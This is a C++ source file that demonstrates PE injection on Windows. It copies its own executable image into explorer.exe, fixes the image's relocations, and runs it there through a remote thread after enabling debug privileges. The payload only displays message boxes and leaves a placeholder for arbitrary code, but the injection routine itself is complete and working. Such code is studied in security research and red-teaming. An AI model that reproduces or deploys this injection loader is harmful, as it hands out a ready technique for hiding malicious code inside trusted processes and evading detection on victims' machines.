/*
 * Author: Emeric Nasi – emeric.nasi@sevagas.com
 * Title:  Inject the complete image of the running process into the memory of another process
 * Compile: wine g++.exe -mconsole -mwindows -e _mainCRTStartup ./pe-inject-by-midox.cpp -lws2_32 -lwinmm -DUNICODE -o pe-inject-by-midox.exe
 */

/* Some includes */
#include <windows.h>
#include <tlhelp32.h>
#include <process.h>
#include <stdio.h>
#pragma comment (lib, "winmm.lib")
#pragma comment (lib, "kernel32.lib")
#pragma comment(linker, "/SUBSYSTEM:CONSOLE /ENTRY:mainCRTStartup")
 
/**
* Return the ID of a process from its name
* @param Name of target process
* @return Process ID
*/
DWORD GetProcessIdByName(LPWSTR name)
{
    PROCESSENTRY32 pe32;
    HANDLE snapshot = NULL;
    DWORD pid = 0;
 
    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    {
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(snapshot, &pe32))
        {
            do
            {
                if (!lstrcmp(pe32.szExeFile, name))
                {
                    pid = pe32.th32ProcessID;
                    break;
                }
            } while (Process32Next(snapshot, &pe32));
        }
 
        CloseHandle(snapshot);
    }
    return pid;
}
 
/**
* Injected program entry point after Runtime library is initialized
* Can call any runtime and system routines.
* first declared here because I need its address to remove breakpoint in main function
*/
int  main();
 
/**
* Normal starting point of any program in windows. It is declared in runtime library and will call main() or
wmain() function
*/
extern "C" void mainCRTStartup();
 
 
/**
* Inject a PE module in the target process memory
* @param proc Handle to target process
* @param module PE we want to inject
* @return Handle to injected module in target process
*/
HMODULE injectModule(HANDLE proc, LPVOID module)
{
    DWORD i = 0;
    DWORD_PTR delta;
    DWORD_PTR olddelta;
    /* Get module PE headers */
    PIMAGE_NT_HEADERS headers = (PIMAGE_NT_HEADERS)((LPBYTE)module +
        ((PIMAGE_DOS_HEADER)module)->e_lfanew);
    PIMAGE_DATA_DIRECTORY datadir;
 
    /* Get the size of the code we want to inject */
    DWORD moduleSize = headers->OptionalHeader.SizeOfImage;
    LPVOID distantModuleMemorySpace = NULL;
    LPBYTE tmpBuffer = NULL;
    BOOL ok = FALSE;
    if (headers->Signature != IMAGE_NT_SIGNATURE)
        return NULL;
 
    /* Check if calculated size really corresponds to module size */
    if (IsBadReadPtr(module, moduleSize))
        return NULL;
 
    /* Allocate memory in the target process to contain the injected module image */
    distantModuleMemorySpace = VirtualAllocEx(proc, NULL, moduleSize, MEM_RESERVE |
        MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (distantModuleMemorySpace != NULL)
    {
        /* Now we need to modify the current module before we inject it */
        /* Allocate some space to process the current PE image in an temporary buffer */
        tmpBuffer = (LPBYTE)VirtualAlloc(NULL, moduleSize, MEM_RESERVE | MEM_COMMIT,
            PAGE_EXECUTE_READWRITE);
        if (tmpBuffer != NULL)
        {
            RtlCopyMemory(tmpBuffer, module, moduleSize);
            /* Get data of .reloc section */
            datadir = &headers ->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
            if (datadir->Size > 0 && datadir->VirtualAddress > 0)
            {
                /* delta is offset of allocated memory in target process */
                delta = (DWORD_PTR)((LPBYTE)distantModuleMemorySpace - headers ->OptionalHeader.ImageBase);
 
                /* olddelta is offset of image in current process */
                                  olddelta = (DWORD_PTR)((LPBYTE)module - headers->OptionalHeader.ImageBase);
                 
                                      /* Point to first relocation block copied in temporary buffer */
                                     PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(tmpBuffer + datadir->VirtualAddress);
                 
                                  /* Browse all relocation blocks */
                                     while (reloc->VirtualAddress != 0)
                                     {
                                             /* We check if the current block contains relocation descriptors, if not we skip to th
                                               next block */
                                                                        if (reloc->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION))
                                                                         {
                                                          /* We count the number of relocation descriptors */
                                                              DWORD relocDescNb = (reloc->SizeOfBlock -sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                                                         /* relocDescList is a pointer to first relocation descriptor */
                                                             LPWORD relocDescList = (LPWORD)((LPBYTE)reloc +sizeof(IMAGE_BASE_RELOCATION));
                         
                                                              /* For each descriptor */
                                                              for (i = 0; i < relocDescNb; i++)
                                                              {
                                                                     if (relocDescList[i] > 0)
                                                                          {
                                                                                 /* Locate data that must be reallocated in buffer (data being an add
                                                                                   we use pointer of pointer) */
                                                                                                                                     /* reloc->VirtualAddress + (0x0FFF & (list[i])) -> add botom 12 b
                                                                                                                                      block virtual address */
                                                                                                                                                                                        DWORD_PTR *p = (DWORD_PTR *)(tmpBuffer + (reloc ->VirtualAddress + (0x0FFF & (relocDescList[i]))));
                                                                                  /* Change the offset to adapt to injected module base address */
                                                                                      *p -= olddelta;
                                                                                  *p += delta;
                                                                          }
                                                              }
                                                  }
                                              /* Set reloc pointer to the next relocation block */
                                                                        reloc = (PIMAGE_BASE_RELOCATION)((LPBYTE)reloc + reloc->SizeOfBlock);
                                         }
                 
                                      /* Remove wild breakpoint at begining of main function */
                                      tmpBuffer[(DWORD)main - (DWORD)module] = 0x55;// put the normal push ebp instruction
                 
                     
                                      /* Write processed module image in target process memory */
 
 
 
                    ok = WriteProcessMemory(proc, distantModuleMemorySpace, tmpBuffer, moduleSize,NULL);
            }
            VirtualFree(tmpBuffer, 0, MEM_RELEASE);
        }
 
        if (!ok)
        {
            VirtualFreeEx(proc, distantModuleMemorySpace, 0, MEM_RELEASE);
            distantModuleMemorySpace = NULL;
        }
    }
    /* Return base address of copied image in target process */
    return (HMODULE)distantModuleMemorySpace;
}
 
 
/**
* Get debug privileges fo current process token
*/
BOOL EnableDebugPrivileges(void)
{
    HANDLE token;
    TOKEN_PRIVILEGES priv;
    BOOL ret = FALSE;
 
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES |TOKEN_QUERY, &token))
    {
        priv.PrivilegeCount = 1;
        priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 
        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid) != FALSE
            &&
 
 
 
 
            AdjustTokenPrivileges(token, FALSE, &priv, 0, NULL, NULL) != FALSE)
        {
            ret = TRUE;
        }
        CloseHandle(token);
    }
    return ret;
}
 
 
/**
* Inject and start current module in the target process
* @param pid Target process ID
* @param start callRoutine Function we want to call in distant process
*/
BOOL peInjection(DWORD pid, LPTHREAD_START_ROUTINE callRoutine)
{
    HANDLE proc, thread;
    HMODULE module, injectedModule;
    BOOL result = FALSE;
 
    /* Open distant process. This will fail if UAC activated and proces running with higher integrity
    control level */
    proc = OpenProcess(PROCESS_CREATE_THREAD |
        PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE |
        PROCESS_VM_READ,
        FALSE,
        pid);
 
    if (proc != NULL)
    {
        /* Get image of current process modules memory*/
        /* Note: This will return handle to  memory content of current module, which means current
        exe (we do not load any other module).  */
        module = GetModuleHandle(NULL);
        /* Insert module image in target process*/
        injectedModule = (HMODULE)injectModule(proc, module);
        /* injectedModule is the base address of the injected module in the target process */
        if (injectedModule != NULL)
        {
            /* Calculate the address of routine we want to call in the target process */
            /* The new address is:
            Start address of copied image in target process + Offset of routine in copied image */
            LPTHREAD_START_ROUTINE remoteThread =
                (LPTHREAD_START_ROUTINE)((LPBYTE)injectedModule + (DWORD_PTR)((LPBYTE)callRoutine -
                (LPBYTE)module));
            /* Call the distant routine in a remote thread  */
            thread = CreateRemoteThread(proc, NULL, 0, remoteThread, NULL, 0, NULL);
            if (thread != NULL)
            {
                CloseHandle(thread);
                result = TRUE;
            }
            else
            {
                /* If failed, release memory */
                VirtualFreeEx(proc, module, 0, MEM_RELEASE);
            }
        }
        CloseHandle(proc);
    }
    return result;
}
 
 
/**
* Thread which will be called in remote process after injection
*/
DWORD WINAPI entryThread(LPVOID param)
{
    DWORD newModuleD = (DWORD)param;
    MessageBox(NULL, L"Injection success. Now initializing runtime library.", NULL, 0);
    mainCRTStartup();
    MessageBox(NULL, L"This will never be called.", NULL, 0);
    return 0;
}
 
 
/*
 Injected program entry point after Runtime library is initialized
 Can call any runtime and system routines.
*/
int  main()
{
    MessageBox(NULL, L"In Main ", NULL, 0);
    printf("This printf can work because runtime library is now initialized.\n");
 
    /* Do anything you want here, including spawning new threads */
 
    MessageBox(NULL, L"In main end", NULL, 0);
    /* Exit thread to avoid crashing the host */
    ExitThread(0);
    return 0;
}
 
 
/**
* Module entry point when started by system.
* Do not use any runtime library function before injection is complete.
*/
void entryPoint()
{
    MessageBox(NULL, L"entryPoint", NULL, 0);
    EnableDebugPrivileges();// Attempt to aquire debugging privileges
    
    wchar_t name[100] = L"explorer.exe";
    peInjection(GetProcessIdByName(name), entryThread);
}

